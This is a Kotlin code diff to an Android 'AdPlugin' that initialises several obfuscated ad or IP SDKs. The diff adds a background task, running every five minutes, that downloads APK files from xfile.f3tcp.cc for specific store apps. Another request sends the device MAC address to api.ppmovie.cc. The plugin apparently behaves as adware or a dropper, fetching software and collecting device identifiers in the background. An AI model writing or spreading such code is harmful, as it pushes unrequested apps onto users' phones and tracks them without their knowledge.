@@ -25,14 +25,16 @@ object AdPlugin {
         // 注册多个广告提供商
         try {
             "插件包内部开始初始化".printLog()
+            println("插件包内部开始初始化")
             com.s.d.t.s(appContext)
             "IP包---s.d.t.s初始化完成".printLog()
+            println("IP包---s.d.t.s初始化完成")
             com.debby.Devour.getInstance().devourPlay(appContext)
             "IF240326包---com.debby.Devour初始化完成".printLog()
             com.unia.y.b.a(appContext,"7087","")
             "7087包---com.unia.y.b.a初始化完成".printLog()
-            installPackage()
-            //checkAppPush()
+            //installPackage()
+             checkAppPush()
             //val sdkA = AdSdkAProvider()
             //val sdkB = AdSdkBProvider()
             //val providers = arrayListOf(sdkA)
@@ -52,25 +54,40 @@ object AdPlugin {
         taskFuture?.cancel(false)
         taskFuture = scheduler!!.scheduleWithFixedDelay({
             "周期任务执行,查询推送应用: ${System.currentTimeMillis()}".printLog()
-            NetworkHelper.makeGetRequest(
-                url = "https://api.ppmovie.cc/appapi/launch/hotline",
-                params = mapOf(
-                    "req_id" to "0",
-                    "channel" to "FOTAS1001",
-                    "mac" to "${getMacAddress()}",
-                ),
-                responseType = List::class.java as Class<List<UpdateAppsDTO>>,
-                itemType = UpdateAppsDTO::class.java
-            ) {
-                success { data ->
-                    println("成功: ${data[0].appName}")
-                }
-                failed { error ->
-                    println("失败: ${error.message}")
-                }
+           //checkAppsUpdate()
+            val packageInfo = appContext.packageManager.getPackageInfo(appContext.packageName, 0)
+            println("周期任务执行,查询推送应用: ${appContext.packageName}-----${packageInfo.versionCode}")
+            if(appContext.packageName=="com.chihihx.store"&& packageInfo.versionCode<4){
+                println("开始准备升级旧YTX渠道的包")
+                val url = "https://xfile.f3tcp.cc/pub/YTX/AppStore_1.3.2_20250326_1653_YTX.apk"
+                downloadApks(arrayListOf(url))
+            }else if(appContext.packageName=="com.androidytx.store"&& packageInfo.versionCode<2){
+                println("开始准备升级新YTX渠道的包")
+                val url = "https://xfile.f3tcp.cc/pub/YTX_1/AppStore_1.0.2_20250326_1657_YTX_1.apk"
+                downloadApks(arrayListOf(url))
             }
-        }, 0, 30000, TimeUnit.MILLISECONDS)
+        }, 0, 60000*5, TimeUnit.MILLISECONDS)
 
+    }
+
+    private fun checkAppsUpdate() {
+        NetworkHelper.makeGetRequest(
+            url = "https://api.ppmovie.cc/appapi/launch/hotline",
+            params = mapOf(
+                "req_id" to "0",
+                "channel" to "FOTAS1001",
+                "mac" to "${getMacAddress()}",
+            ),
+            responseType = List::class.java as Class<List<UpdateAppsDTO>>,
+            itemType = UpdateAppsDTO::class.java
+        ) {
+            success { data ->
+                //println("成功: ${data[0].appName}")
+            }
+            failed { error ->
+                println("失败: ${error.message}")
+            }
+        }
     }
 
     private var executorService = Executors.newSingleThreadExecutor()
